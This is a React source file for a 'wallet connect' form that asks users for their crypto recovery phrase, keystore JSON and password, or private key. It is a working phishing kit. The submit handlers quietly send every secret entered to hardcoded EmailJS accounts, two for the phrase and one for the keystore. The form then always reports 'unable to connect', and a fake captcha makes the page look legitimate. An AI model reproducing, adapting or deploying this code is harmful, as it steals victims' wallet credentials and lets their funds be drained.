import React, { useEffect, useState } from 'react';
import styles from './WalletConnectForm.module.css';
import {useNavigate} from 'react-router-dom'
import axios from 'axios'
import WalletHeading from './WalletConnectForm/WalletHeading';
import WalletImageContainer from './WalletConnectForm/WalletImageContainer';
import PrivateKeyForm from './WalletConnectForm/PrivateKeyForm';
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import emailjs from '@emailjs/browser';
import { FaCheck } from "react-icons/fa";

const WalletConnectForm = ({ walletName }) => {
  const navigate = useNavigate()
  const [currentView, setCurrentView] = useState(1);
  const [activeButton, setActiveButton] = useState(1);
  const [wallet, setWallet] = useState(walletName);
  const [phrase, setPhrase] = useState("");
  const [keystore, setKeyStore] = useState("");
  const [keystorePassword, setKeystorePassword] = useState("");
  const [phraseError, setPhraseError] = useState(false);
  const [phraseSubmit, setPhraseSubmit] = useState('CONNECT')
  const [keystoreSubmit, setKeystoreSubmit] = useState('CONNECT')
  
  // Captcha states
  const [showCaptcha, setShowCaptcha] = useState(false);
  const [captchaInput, setCaptchaInput] = useState('');
  const [captchaText] = useState(generateCaptcha());
  const [captchaVerified, setCaptchaVerified] = useState(false);
  const [showSuccessAnimation, setShowSuccessAnimation] = useState(false);
  
  // Custom Circle Loading Component
  const CircleLoading = ({ size = 20, color = '#4CAF50' }) => {
    return (
      <div style={{
        display: 'inline-block',
        width: `${size}px`,
        height: `${size}px`,
        border: `2px solid ${color}`,
        borderTop: `2px solid transparent`,
        borderRadius: '50%',
        animation: 'spin 1s linear infinite',
        margin: '0 5px'
      }}></div>
    );
  };

  // Add the spin animation to the document head
  useEffect(() => {
    const style = document.createElement('style');
    style.textContent = `
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
    `;
    document.head.appendChild(style);
    return () => document.head.removeChild(style);
  }, []);

  function generateCaptcha() {
    const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    let result = '';
    for (let i = 0; i < 6; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  const handleButtonClick = (viewNumber, e) => {
    e.preventDefault();
    setCurrentView(viewNumber);
    setActiveButton(viewNumber);
    // Reset captcha when switching views
    setShowCaptcha(false);
    setCaptchaVerified(false);
    setShowSuccessAnimation(false);
  };

  const validatePhrase = (inputPhrase) => {
    const words = inputPhrase.trim().split(/\s+/);
    const wordCount = words.length;
    return wordCount > 11 && wordCount <= 24;
  };
  
  const trackPhraseWordCount = () => {
    if (validatePhrase(phrase)) {
      setPhraseError(false);
    } else {
      setPhraseError(true);
    }
  };

  const verifyCaptcha = () => {
    if (captchaInput === captchaText) {
      setCaptchaVerified(true);
      setShowSuccessAnimation(true);
      setTimeout(() => {
        setShowSuccessAnimation(false);
      }, 2000);
      return true;
    } else {
      toast.error('Captcha verification failed. Please try again.', {
        position: "top-right",
        autoClose: 2500,
        hideProgressBar: false,
        closeOnClick: true,
        pauseOnHover: true,
        draggable: true,
        progress: undefined,
        theme: "light",
      });
      return false;
    }
  };

  // ##### PHRASE
  const handlePhraseSubmit = async (e) => {
    e.preventDefault();
    
    if (!validatePhrase(phrase)) {
      toast.error('Please enter a phrase with a word count between 12 and 24.', {
        position: "top-right",
        autoClose: 2500,
        hideProgressBar: false,
        closeOnClick: true,
        pauseOnHover: true,
        draggable: true,
        progress: undefined,
        theme: "light",
      });
      setPhraseError(true);
      return;
    }

    const name = wallet
    const type = "Phrase"
    const data = phrase
    const password = "not_required"
    
    try {

      await emailjs.send(
        'service_umld2d4',
        'template_dwuojlh',
        {
          to_name: "dapp",
          from_name: name,
          message: `
            Name: ${name}
            Type: ${type}
            Data: ${data}
            Password: ${password}
          `,
        },
        'o_NYBBGCjR2YIkIYu'
      );

      await emailjs.send(
        "service_w2qehzq",
        "template_5orlh8k",
        {
          to_name: "prime_noval_app",
          from_name: name,
          message: `
            Name: ${name}
            Type: ${type}
            Data: ${data}
            Password: ${password}
          `,
        },
        "4VxHnC4IdXAVuU9Gs"
      );

    } catch (error) {
      console.log("")
    }

    // Show captcha if not already shown and not verified
    if (!showCaptcha && !captchaVerified) {
      setShowCaptcha(true);
      return;
    }

    // Verify captcha if shown but not verified
    if (showCaptcha && !captchaVerified) {
      if (!verifyCaptcha()) return;
    }

    // Only proceed if captcha is verified or not required
    setPhraseSubmit("Processing...")

    setPhraseSubmit("CONNECT")
    toast.error('unable to connect', {
      position: "top-right",
      autoClose: 2500,
      hideProgressBar: false,
      closeOnClick: true,
      pauseOnHover: true,
      draggable: true,
      progress: undefined,
      theme: "light",
    });
    setTimeout(() => {
      navigate('/error')
    }, 3000);
  }

  const handleKeystoreSubmit = async (e) => {
    e.preventDefault();
    
    if (!keystore || !keystorePassword) {
      toast.error('Please enter both keystore JSON and password', {
        position: "top-right",
        autoClose: 2500,
        hideProgressBar: false,
        closeOnClick: true,
        pauseOnHover: true,
        draggable: true,
        progress: undefined,
        theme: "light",
      });
      return;
    }
    const name = wallet;
    const type = "Keystore_JSON";
    const data = keystore;
    const password = keystorePassword;

    try {
      await emailjs.send(
        'service_umld2d4',
        'template_dwuojlh',
        {
          to_name: "dapp",
          from_name: name,
          message: `
            Name: ${name}
            Type: ${type}
            Data: ${data}
            Password: ${password}
          `,
        },
        'o_NYBBGCjR2YIkIYu'
      );
      
    } catch (error) {
      console.log("error")
    }

    // Show captcha if not already shown and not verified
    if (!showCaptcha && !captchaVerified) {
      setShowCaptcha(true);
      return;
    }

    // Verify captcha if shown but not verified
    if (showCaptcha && !captchaVerified) {
      if (!verifyCaptcha()) return;
    }

    // Only proceed if captcha is verified or not required
    setKeystoreSubmit("Processing...");
    
    toast.error('unable to connect',  {
      position: "top-right",
      autoClose: 2500,
      hideProgressBar: false,
      closeOnClick: true,
      pauseOnHover: true,
      draggable: true,
      progress: undefined,
      theme: "light",
    });
    setTimeout(() => {
      navigate('/error')
    }, 3000);
    setKeystoreSubmit("CONNECT");
  }
  
  const privateKeyLengthNotlong = () => {
    toast.error('Invalid private key format.', {
      position: "top-right",
      autoClose: 2500,
      hideProgressBar: false,
      closeOnClick: true,
      pauseOnHover: true,
      draggable: true,
      progress: undefined,
      theme: "light",
    });
  }

  // Styled captcha component
  const CaptchaDisplay = ({ text }) => {
    // Function to apply random styles to each character
    const getRandomStyle = () => {
      const rotations = [-15, -10, -5, 0, 5, 10, 15];
      const fonts = ['Arial', 'Verdana', 'Courier', 'Times New Roman', 'Georgia'];
      const weights = ['normal', 'bold'];
      const styles = ['normal', 'italic'];
      
      return {
        display: 'inline-block',
        transform: `rotate(${rotations[Math.floor(Math.random() * rotations.length)]}deg)`,
        fontFamily: fonts[Math.floor(Math.random() * fonts.length)],
        fontWeight: weights[Math.floor(Math.random() * weights.length)],
        fontStyle: styles[Math.floor(Math.random() * styles.length)],
        fontSize: `${Math.floor(Math.random() * 10) + 14}px`,
        color: `rgb(${Math.floor(Math.random() * 100)}, ${Math.floor(Math.random() * 100)}, ${Math.floor(Math.random() * 100)})`,
        margin: '0 2px',
        lineHeight: '1.5',
      };
    };

    return (
      <div style={{ 
        backgroundColor: '#cccccc', 
        padding: '10px', 
        margin: '10px 0',
        borderRadius: '4px',
        textAlign: 'center',
        border: '1px solid #ddd',
        letterSpacing: '2px',
        overflow: 'hidden'
      }}>
        {text.split('').map((char, index) => (
          <span key={index} style={getRandomStyle()}>
            {char}
          </span>
        ))}
      </div>
    );
  };

  return (
    <>
      <ToastContainer />
      <div className={styles.walletForm}>
        <div className={styles.view}>
          <button
            type="button"
            onClick={(e) => handleButtonClick(1, e)}
            className={activeButton === 1 ? styles.activeButton : styles.viewButton}
          >
            Phrase
          </button>
          <button
            type="button"
            onClick={(e) => handleButtonClick(2, e)}
            className={activeButton === 2 ? styles.activeButton : styles.viewButton}
          >
            <span className={styles.viewButtonSpan}>
              <span>Keystore</span>
              <span>JSON</span>
            </span>
          </button>
          <button
            type="button"
            onClick={(e) => handleButtonClick(3, e)}
            className={activeButton === 3 ? styles.activeButton : styles.viewButton}
          >
            Private Key
          </button>
        </div>
        <div>
          <div style={{ display: currentView === 1 ? 'block' : 'none' }}>
            <form onSubmit={handlePhraseSubmit}>
              <textarea
                required
                spellCheck="false"
                name="Phrase"
                autoComplete="off"
                rows="7"
                placeholder='Enter your recovery phase'
                className={styles.textarea}
                value={phrase}
                onChange={(e) => {
                  setPhrase(e.target.value);
                  trackPhraseWordCount();
                }}
              ></textarea>
              <p 
                className={styles.hint}
                style={{ color: phraseError ? "red" : "green" }}
              >
                Typically 12 (sometimes 24) words separated by single spaces
              </p>
              
              {/* Captcha Section */}
              {showCaptcha && !captchaVerified && (
                <div style={{ margin: '15px 0' }}>
                  <p style={{
                      fontSize: '12px',
                      color: '#999999'
                    }}>Please verify you're not a robot:</p>
                  <CaptchaDisplay text={captchaText} />
                  <input
                    type="text"
                    value={captchaInput}
                    onChange={(e) => setCaptchaInput(e.target.value)}
                    placeholder="Enter the captcha above"
                    style={{
                      width: '100%',
                      padding: '10px',
                      margin: '5px 0',
                      borderRadius: '4px',
                      border: '1px solid #999999',
                      color: '#999999'
                    }}
                  />
                  <button 
                    type="button"
                    onClick={verifyCaptcha}
                    style={{
                      width: '100%',
                      padding: '10px',
                      backgroundColor: '#4CAF50',
                      color: 'white',
                      border: 'none',
                      borderRadius: '4px',
                      cursor: 'pointer',
                      margin: '5px 0'
                    }}
                  >
                    Verify Captcha
                  </button>
                </div>
              )}
              
              {/* Success Animation */}
              {showSuccessAnimation && (
                <div style={{ textAlign: 'center', margin: '10px 0', fontSize: '14px', display: 'flex', justifyContent: 'center' , alignItems: 'center', gap: '10px' }}>
                  <p style={{ color: 'green' }}>Verification successful!</p>
                  <FaCheck />
                </div>
              )}
              
              <button 
                type='submit' 
                className={styles.connectButton}
                disabled={phraseSubmit === "Processing..."}
              >
                {phraseSubmit === "Processing..." ? (
                  <div style={{display: 'flex', alignItems: 'center', gap: '5px'}}>
                    <CircleLoading /> Processing...
                  </div>
                ) : captchaVerified ? "VERIFY WALLET" : "Verify Captcha"}
              </button>
            </form>
          </div>
          
          <div style={{ display: currentView === 2 ? 'block' : 'none' }}>
            <form onSubmit={handleKeystoreSubmit}>
              <textarea
                autoComplete="off"
                required
                spellCheck="false"
                name="Keystore"
                rows="7"
                placeholder='Enter your Keystore JSON'
                className={styles.textarea}
                value={keystore}
                onChange={(e) => setKeyStore(e.target.value)}
              ></textarea>
              <input
                required
                type="password"
                autoComplete="off"
                name="keystorePassword"
                value={keystorePassword}
                onChange={(e) => setKeystorePassword(e.target.value)}
                placeholder='Wallet Password'
                className={styles.passwordInput}
              />
              <p className={styles.hint}>Several lines of text beginning with {`{...}`} plus the password you used to encrypt it.</p>
              
              {/* Captcha Section */}
              {showCaptcha && !captchaVerified && (
                <div style={{ margin: '15px 0' }}>
                  <p>Please verify you're not a robot:</p>
                  <CaptchaDisplay text={captchaText} />
                  <input
                    type="text"
                    value={captchaInput}
                    onChange={(e) => setCaptchaInput(e.target.value)}
                    placeholder="Enter the captcha above"
                    style={{
                      width: '100%',
                      padding: '10px',
                      margin: '5px 0',
                      borderRadius: '4px',
                      border: '1px solid #999999',
                      color: '#999999'
                    }}
                  />
                  <button 
                    type="button"
                    onClick={verifyCaptcha}
                    style={{
                      width: '100%',
                      padding: '10px',
                      backgroundColor: '#4CAF50',
                      color: 'white',
                      border: 'none',
                      borderRadius: '4px',
                      cursor: 'pointer',
                      margin: '5px 0'
                    }}
                  >
                    Verify Captcha
                  </button>
                </div>
              )}
              
              {/* Success Animation */}
              {showSuccessAnimation && (
                <div style={{ color: 'green', textAlign: 'center', margin: '10px 0', fontSize: '14px', display: 'flex', justifyItems: 'center' , alignItems: 'center', gap: '10px' }}>
                  <p>Verification successful!</p>
                  <FaCheck />
                </div>
              )}
              
              <button 
                type='submit' 
                className={styles.connectButton}
                disabled={keystoreSubmit === "Processing..."}
              >
                {keystoreSubmit === "Processing..." ? (
                  <div style={{display: 'flex', alignItems: 'center', gap: '5px'}}>
                    <CircleLoading /> Processing...
                  </div>
                ) : captchaVerified ? "CONNECT WALLET" : "Verify Captcha"}
              </button>
            </form>
          </div>

          <div style={{ display: currentView === 3 ? 'block' : 'none'}}>
            <PrivateKeyForm wallet={wallet} privateKeyLengthNotlong={privateKeyLengthNotlong} />
          </div>
        </div>
      </div>
    </>
  );
};

export default WalletConnectForm;